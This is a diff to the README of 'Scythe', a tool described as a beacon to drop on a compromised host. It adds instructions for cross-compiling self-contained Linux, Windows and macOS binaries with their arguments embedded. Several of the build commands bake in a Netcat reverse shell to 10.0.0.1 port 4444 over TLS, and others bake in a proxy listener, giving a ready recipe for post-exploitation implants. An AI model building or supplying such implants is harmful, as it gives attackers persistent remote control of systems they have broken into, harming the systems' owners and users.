@@ -10,6 +10,8 @@ All in one beacon to drop on a compromised host
 
 You can compile subcommand and flags into the binary so it runs with **no command-line arguments** (e.g. `./Scythe.embedded` only). The same tokens are used as after the program name today: a JSON array of strings.
 
+The embedded payload is just data inside the executable; **the executable must match the OS and CPU you run it on.** Build on your dev machine and pass a **target OS** to produce a standalone binary for Linux, Windows, or macOS without needing that OS locally as the build host (Go cross-compiles).
+
 **Using the helper script** (from the repo root):
 
 ```bash
@@ -17,7 +19,31 @@ You can compile subcommand and flags into the binary so it runs with **no comman
 ./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]'
 ```
 
-Default output is `./Scythe.embedded` if you omit the second argument.
+Optional **third argument** — `linux`, `windows`, or `darwin` (aliases: `macos` for Darwin): sets `GOOS` for a cross-compile. Optional **fourth argument** — CPU / architecture (mapped to Go’s `GOARCH`). If you omit the fourth argument when cross-compiling, `GOARCH` defaults to **`amd64`** unless you set the **`GOARCH`** environment variable (e.g. `GOARCH=arm64 ./scripts/build-embedded.sh … linux`). `CGO_ENABLED=0` is set for cross-builds.
+
+Common **architecture names** (case-insensitive):
+
+| You pass | Go `GOARCH` |
+|----------|-------------|
+| `amd64`, `x86_64`, `x64` | `amd64` |
+| `386`, `x86`, `i386`, `i686` | `386` |
+| `arm`, `armv7`, `armv7l` | `arm` |
+| `arm64`, `aarch64` | `arm64` |
+| `riscv64`, `ppc64le` | same |
+
+Other lowercase names without extra punctuation may be passed through to `go build` (e.g. `riscv64`).
+
+```bash
+./scripts/build-embedded.sh '["Http","-url","https://example.com/api","-timeout","30s"]' ./Scythe.exe windows amd64
+./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]' ./Scythe.bin linux x86_64
+./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe.arm64 darwin arm64
+./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe-linux-arm linux arm
+GOARCH=arm64 ./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe.arm64-linux linux   # fourth arg omitted: env sets arch
+```
+
+Omit the third (and fourth) argument to build for **whatever OS/arch you are running `go build` on** (native).
+
+Default output filename is `./Scythe.embedded` if you omit the second argument.
 
 **Generating JSON safely (recommended for real invocations):** hand-written JSON breaks easily when `-headers` or other values contain commas, spaces, or quotes. Build the same token list you would pass on the CLI, serialize with Python, then pass the result to the script (the script base64-encodes it for `-ldflags`; you do not need to run `base64` yourself).
 
@@ -82,11 +108,25 @@ PY
 ./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
 ```
 
-**Manual `go build`:** take the same `JSON` variable as above (Http or network), then base64 (no newlines) and link:
+**Manual `go build`:** take the same `JSON` variable as above (Http or network), then base64 (no newlines) and link. For a **non-native** OS/arch, set `GOOS`, `GOARCH`, and `CGO_ENABLED=0`:
 
 ```bash
 JSON=$(python3 -c 'import json; print(json.dumps(["Http","-url","https://example.com","-timeout","30s"]))')
 B64=$(printf '%s' "$JSON" | base64 | tr -d '\n')
+GOOS=linux GOARCH=arm64 CGO_ENABLED=0 go build -trimpath \
+  -ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
+  -o Scythe-linux-arm64 ./cmd
+```
+
+```bash
+GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -trimpath \
+  -ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
+  -o Scythe.exe ./cmd
+```
+
+Native build (omit `GOOS` / `GOARCH` or set them to match your machine):
+
+```bash
 go build -trimpath \
   -ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
   -o Scythe.embedded ./cmd
